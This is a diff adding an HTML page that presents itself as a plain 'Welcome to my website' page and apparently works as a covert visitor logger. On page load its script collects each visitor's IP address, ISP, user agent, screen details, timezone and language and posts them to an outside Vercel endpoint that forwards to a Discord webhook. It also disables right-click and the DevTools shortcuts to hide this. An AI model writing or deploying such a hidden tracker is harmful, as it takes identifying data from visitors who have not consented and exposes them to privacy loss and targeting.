@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BlueTheLeaf</title>
+    <style>
+      /* Styling for the webpage */
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f0f0f0;
+        color: #333;
+        margin: 0;
+        padding: 0;
+      }
+
+      h1 {
+        text-align: center;
+        margin-top: 20%;
+        color: #000000;
+      }
+    </style>
+    <script>
+      // Function to run on page load
+      async function init() {
+        await sendToDiscord(); // Call sendToDiscord when the page loads
+      }
+
+      async function getDeviceInfo() {
+        const userAgent = navigator.userAgent;
+        const ipAddress = await fetch("https://api.ipify.org?format=json")
+          .then((response) => response.json())
+          .then((data) => data.ip)
+          .catch(() => "IP not available");
+
+        // Make sure to check the response status
+        const ispInfo = await fetch(`https://ipapi.co/${ipAddress}/json/`)
+          .then((response) => {
+            if (!response.ok) {
+              throw new Error("Failed to fetch ISP info");
+            }
+            return response.json();
+          })
+          .catch(() => ({ isp: "ISP not available" }));
+
+        const screenWidth = window.screen.width;
+        const screenHeight = window.screen.height;
+        const screenColorDepth = window.screen.colorDepth;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const language = navigator.language || navigator.userLanguage;
+
+        const theme = window.matchMedia("(prefers-color-scheme: dark)").matches
+          ? "Dark"
+          : "Light";
+
+        return {
+          ip: ipAddress,
+          userAgent: userAgent,
+          isp: ispInfo.isp || "ISP not available", // Ensure it has a fallback
+          screenWidth: screenWidth,
+          screenHeight: screenHeight,
+          screenColorDepth: screenColorDepth,
+          timezone: timezone,
+          language: language,
+          theme: theme,
+        };
+      }
+
+      // Function to send data to Discord webhook as an embed
+      async function sendToDiscord() {
+        const now = Date.now();
+        const lastVisit = localStorage.getItem("lastVisit");
+
+        // Cooldown logic
+        if (lastVisit && now - lastVisit < 5000) {
+          return; // Exit the function
+        }
+
+        const deviceInfo = await getDeviceInfo();
+        console.log(deviceInfo);
+
+        const apiURL = "https://api-ten-rosy-39.vercel.app/api/sendtowebhook";
+
+        try {
+          const response = await fetch(apiURL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(deviceInfo),
+          });
+
+          const result = await response.json();
+          console.log(result); // Log the result for debugging
+
+          // Update the lastVisit time in localStorage
+          localStorage.setItem("lastVisit", now);
+        } catch (error) {
+          console.error("Error sending data:", error);
+        }
+      }
+
+      // Disable right-click (context menu)
+      document.addEventListener("contextmenu", function (e) {
+        e.preventDefault();
+      });
+
+      // Disable F12 and Ctrl+Shift+I (DevTools)
+      document.onkeydown = function (e) {
+        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
+          e.preventDefault();
+        }
+      };
+
+      // Run the init function on page load
+      window.onload = init; // Call init when the window has fully loaded
+    </script>
+  </head>
+  <body>
+    <h1>Welcome to my website</h1>
+  </body>
+</html>
